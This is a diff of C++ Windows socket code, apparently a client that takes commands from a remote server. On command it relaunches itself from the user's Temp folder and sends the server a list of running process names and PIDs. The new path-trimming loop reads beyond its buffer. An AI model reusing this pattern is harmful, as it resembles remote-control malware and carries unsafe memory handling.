@@ -238,7 +238,7 @@ void ricevi(SOCKET s)
 			if(msg[0]=='H' && msg[1]=='H')
 			{
 				cout<<"<Server> Client reset."<<endl;
-				system("start Prova.exe");//3RIF
+				system("start pipo.exe");//3RIF
 				closesocket(s);
 				v=-1;
 				return;
@@ -520,12 +520,22 @@ void ricevi(SOCKET s)
 			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
 			            if(NULL!=hProcess)
 					    {
-					        HMODULE hMod;
-					        DWORD cbNeeded;
-					        if(EnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded))
-					            GetModuleBaseName(hProcess,hMod,szProcessName,sizeof(szProcessName)/sizeof(TCHAR));
+					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
 					        if(szProcessName[0]!='<')
-					        	n++;
+						    {
+						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
+						    	{
+						    		if(szProcessName[cnt]=='\\')
+						    		{
+						    			for(int ii=1;ii<100;ii++)
+						    			{
+						    				szProcessName[ii-1]=szProcessName[cnt+ii];
+										}
+										cnt=0;
+									}
+								}
+						    	n++;
+							}
 					        CloseHandle(hProcess);
 					    }
 			        }
@@ -542,14 +552,21 @@ void ricevi(SOCKET s)
 			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
 			            if(NULL!=hProcess)
 					    {
-					        HMODULE hMod;
-					        DWORD cbNeeded;
-					        if(EnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded))
-					            GetModuleBaseName(hProcess,hMod,szProcessName,sizeof(szProcessName)/sizeof(TCHAR));
-					        if(szProcessName[0]!='<')
-					        {
-					        	//memcpy(Pid, &aProcesses[i], sizeof(aProcesses[i]));
-					        	int tmp=aProcesses[i];
+					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
+					    	if(szProcessName[0]!='<')
+						    {
+						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
+						    	{
+						    		if(szProcessName[cnt]=='\\')
+						    		{
+						    			for(int ii=1;ii<100;ii++)
+						    			{
+						    				szProcessName[ii-1]=szProcessName[cnt+ii];
+										}
+										cnt=0;
+									}
+								}
+						    	int tmp=aProcesses[i];
 					        	char Pid[MAX_PATH]={0};
 					        	sprintf(Pid,"%d",tmp);
 					        	send(s,szProcessName,sizeof(szProcessName),0);
@@ -652,7 +669,7 @@ bool preliminari()
 	DWORD cchComputerName = 256;
 	char n[256]={'\0'};
 	char p1[256]="\"C:\\Users\\";
-	char p2[256]="\\AppData\\Local\\Temp\\Prova.exe\"";//2RIF
+	char p2[256]="\\AppData\\Local\\Temp\\prova.exe\"";//2RIF
 	char pF[256]={'\0'};
 	char pFN[256]={'\0'};
 	char cmd[256]="start ";
